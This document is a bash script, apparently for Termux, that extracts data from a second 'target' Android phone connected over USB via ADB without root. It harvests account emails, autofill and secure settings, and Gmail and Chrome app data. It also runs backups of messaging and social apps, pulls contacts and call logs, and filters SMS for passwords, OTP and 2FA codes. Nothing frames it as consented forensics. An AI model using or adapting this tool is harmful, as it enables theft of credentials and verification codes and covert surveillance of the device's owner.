#!/bin/bash
# extract_no_root.sh - Full Android extraction WITHOUT root

OUTDIR="android_extract_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"/{accounts,apps,backup,shared_prefs,reports,dumps}

echo "============================================"
echo "  NON-ROOT ANDROID EXTRACTION"
echo "  Target: USB-C Connected Device"
echo "  Requirements: USB Debugging + Unlocked"
echo "============================================"

# ==================== DETECT DEVICE ====================
echo "[1/8] Detecting device over USB..."
termux-usb -l | tee "$OUTDIR/usb_devices.txt"
USB_DEV=$(head -1 "$OUTDIR/usb_devices.txt")
[ -z "$USB_DEV" ] && { echo "[!] No device found"; exit 1; }

termux-usb -r "$USB_DEV"
sleep 2
termux-adb start-server
termux-adb wait-for-device
DEVICE=$(termux-adb devices | grep -v "List" | grep "device$" | head -1 | awk '{print $1}')
[ -z "$DEVICE" ] && { echo "[!] Device not authorized"; exit 1; }
echo "[+] Device: $DEVICE"

# ==================== DEVICE INFO ====================
echo "[2/8] Gathering device info..."
termux-adb shell getprop > "$OUTDIR/device_props.txt" 2>&1
termux-adb shell getprop ro.build.version.sdk | tr -d '\r' > "$OUTDIR/sdk.txt"
SDK=$(cat "$OUTDIR/sdk.txt")
echo "    SDK: $SDK"

# ==================== ACCOUNT DUMP ====================
echo "[3/8] Dumping all accounts..."
termux-adb shell dumpsys account > "$OUTDIR/accounts/account_dump.txt" 2>&1
termux-adb shell dumpsys account --accounts > "$OUTDIR/accounts/account_list.txt" 2>&1

echo "    Google accounts found:"
grep -i 'gmail\|google\|@gmail\|@google' "$OUTDIR/accounts/account_dump.txt" 2>/dev/null | \
    tee "$OUTDIR/accounts/google_accounts.txt"

# Extract every email and account name
grep -oP '[\w.+-]+@[\w-]+\.\w+' "$OUTDIR/accounts/account_dump.txt" 2>/dev/null | \
    sort -u > "$OUTDIR/accounts/all_emails.txt"
echo "    Total emails: $(wc -l < "$OUTDIR/accounts/all_emails.txt")"

# ==================== AUTOFILL / SAVED PASSWORDS METADATA ====================
echo "[4/8] Dumping autofill data (saved credential metadata)..."
termux-adb shell dumpsys autofill > "$OUTDIR/dumps/autofill_dump.txt" 2>&1
termux-adb shell dumpsys webviewupdate > "$OUTDIR/dumps/webview.txt" 2>&1

# Content providers for account data
termux-adb shell content query --uri content://settings/secure \
    --projection name:value 2>/dev/null > "$OUTDIR/dumps/settings_secure.txt"

termux-adb shell content query --uri content://settings/global \
    --projection name:value 2>/dev/null > "$OUTDIR/dumps/settings_global.txt"

# Gmail content provider
termux-adb shell content query \
    --uri content://com.google.android.gm.contentprovider/accounts \
    2>/dev/null > "$OUTDIR/accounts/gmail_provider.txt"

# ==================== APP DATA (run-as for debuggable apps) ====================
echo "[5/8] Attempting app data extraction via run-as..."

try_extract_app() {
    local pkg=$1
    local outname=$2
    echo "    Trying: $pkg"
    
    # Check if run-as works
    local result=$(termux-adb shell "run-as $pkg ls /data/data/$pkg/ 2>/dev/null" 2>/dev/null)
    if [ -n "$result" ]; then
        echo "    [+] run-as works for $pkg"
        mkdir -p "$OUTDIR/apps/$outname"
        
        # Use cp trick to get files to accessible location
        termux-adb shell "run-as $pkg cp -r /data/data/$pkg/shared_prefs /data/local/tmp/${outname}_prefs 2>/dev/null" 2>/dev/null
        termux-adb pull "/data/local/tmp/${outname}_prefs/" "$OUTDIR/apps/$outname/" 2>/dev/null
        termux-adb shell "rm -rf /data/local/tmp/${outname}_prefs" 2>/dev/null
        
        termux-adb shell "run-as $pkg cp -r /data/data/$pkg/databases /data/local/tmp/${outname}_dbs 2>/dev/null" 2>/dev/null
        termux-adb pull "/data/local/tmp/${outname}_dbs/" "$OUTDIR/apps/$outname/" 2>/dev/null
        termux-adb shell "rm -rf /data/local/tmp/${outname}_dbs" 2>/dev/null
        
        termux-adb shell "run-as $pkg cp -r /data/data/$pkg/files /data/local/tmp/${outname}_files 2>/dev/null" 2>/dev/null
        termux-adb pull "/data/local/tmp/${outname}_files/" "$OUTDIR/apps/$outname/" 2>/dev/null
        termux-adb shell "rm -rf /data/local/tmp/${outname}_files" 2>/dev/null
    else
        echo "    [-] run-as failed for $pkg (non-debuggable)"
    fi
}

# Try common apps
try_extract_app "com.google.android.gm" "gmail"
try_extract_app "com.android.chrome" "chrome"
try_extract_app "com.android.vending" "playstore"
try_extract_app "com.google.android.apps.maps" "maps"
try_extract_app "com.google.android.youtube" "youtube"

# ==================== PACKAGE BACKUP VIA ADB BACKUP ====================
echo "[6/8] Attempting ADB backup (may need screen confirmation)..."
echo "    [*] Check target screen - approve the backup!"

# Full backup attempt
termux-adb backup -f "$OUTDIR/backup/full_backup.ab" -apk -shared -all -system \
    2>"$OUTDIR/backup/backup_error.txt" &
BGPID=$!
sleep 8
kill $BGPID 2>/dev/null
wait $BGPID 2>/dev/null

if [ -f "$OUTDIR/backup/full_backup.ab" ]; then
    FSIZE=$(stat -c%s "$OUTDIR/backup/full_backup.ab" 2>/dev/null || echo 0)
    echo "    [+] Backup file created: $FSIZE bytes"
fi

# Try individual app backups for Google apps
echo "    [*] Attempting individual app backups..."
for pkg in $(termux-adb shell pm list packages | grep -iE \
    "google|chrome|gmail|whatsapp|telegram|facebook|instagram|twitter|signal" 2>/dev/null); do
    pkg_name=${pkg#package:}
    echo "    Backing up: $pkg_name"
    termux-adb backup -f "$OUTDIR/backup/${pkg_name}.ab" -noapk "$pkg_name" \
        2>/dev/null &
    sleep 3
    kill $! 2>/dev/null
done

# ==================== SQLITE DATABASE QUERY ON THIRD-PARTY APPS ====================
echo "[7/8] Querying app databases directly via ADB content providers..."

# Contacts (always accessible)
termux-adb shell content query \
    --uri content://com.android.contacts/data/emails \
    --projection display_name:data1 2>/dev/null > "$OUTDIR/reports/contacts_with_emails.txt"

# SMS (if permission granted)
termux-adb shell content query \
    --uri content://sms/inbox \
    --projection address:body:date 2>/dev/null | \
    grep -i "password\|account\|otp\|verification\|2fa\|auth\|login\|@gmail\|@google" \
    > "$OUTDIR/reports/sms_credentials.txt" 2>/dev/null

# Call log
termux-adb shell content query \
    --uri content://call_log/calls \
    --projection number:display_name:date:type 2>/dev/null > "$OUTDIR/reports/call_log.txt"

# User dictionary (often has passwords)
termux-adb shell content query \
    --uri content://com.android.inputmethod.latin.dictionary/user_dict \
    2>/dev/null > "$OUTDIR/reports/user_dictionary.txt"

# ==================== CLIPBOARD & CACHE ====================
echo "[8/8] Gathering clipboard, cache, and misc data..."

# Clipboard (Android 10+ restricted, but worth trying)
termux-adb shell service call clipboard 2>/dev/null > "$OUTDIR/dumps/clipboard.txt"

# Recent screenshots/media
termux-adb shell ls -lt /sdcard/DCIM/Screenshots/ 2>/dev/null | head -20 > "$OUTDIR/reports/recent_screenshots.txt"

# Download directory listing
termux-adb shell ls -lt /sdcard/Download/ 2>/dev/null | head -30 > "$OUTDIR/reports/downloads.txt"

# Build summary
{
    echo "============================================"
    echo " NON-ROOT EXTRACTION SUMMARY"
    echo " Date: $(date)"
    echo "============================================"
    echo ""
    echo "Device: $(cat "$OUTDIR/device_props.txt" 2>/dev/null | grep ro.product.model | cut -d= -f2-)"
    echo "Android: $(cat "$OUTDIR/device_props.txt" 2>/dev/null | grep ro.build.version.release | cut -d= -f2-)"
    echo "SDK: $SDK"
    echo ""
    echo "=== ACCOUNTS ==="
    echo "Google accounts: $(wc -l < "$OUTDIR/accounts/google_accounts.txt" 2>/dev/null)"
    echo "Total emails found: $(wc -l < "$OUTDIR/accounts/all_emails.txt" 2>/dev/null)"
    grep -oP '[\w.+-]+@[\w-]+\.\w+' "$OUTDIR/accounts/account_dump.txt" 2>/dev/null | sort -u
    echo ""
    echo "=== APPS WITH DATA EXTRACTED ==="
    for d in "$OUTDIR/apps"/*/; do
        if [ -d "$d" ]; then
            echo "  - $(basename $d): $(find "$d" -type f 2>/dev/null | wc -l) files"
        fi
    done
    echo ""
    echo "=== BACKUP ==="
    if [ -f "$OUTDIR/backup/full_backup.ab" ]; then
        echo "Full backup: $(stat -c%s "$OUTDIR/backup/full_backup.ab" 2>/dev/null) bytes"
    else
        echo "Full backup: FAILED (screen must be unlocked, backup must be approved)"
    fi
    echo ""
    echo "=== RECOVERED FILES ==="
    find "$OUTDIR" -type f -name "*.xml" -o -name "*.db" -o -name "*.txt" 2>/dev/null | sort
} > "$OUTDIR/FULL_REPORT.txt"

cat "$OUTDIR/FULL_REPORT.txt"
echo ""
echo "[+] Complete. Data saved to: $OUTDIR/"
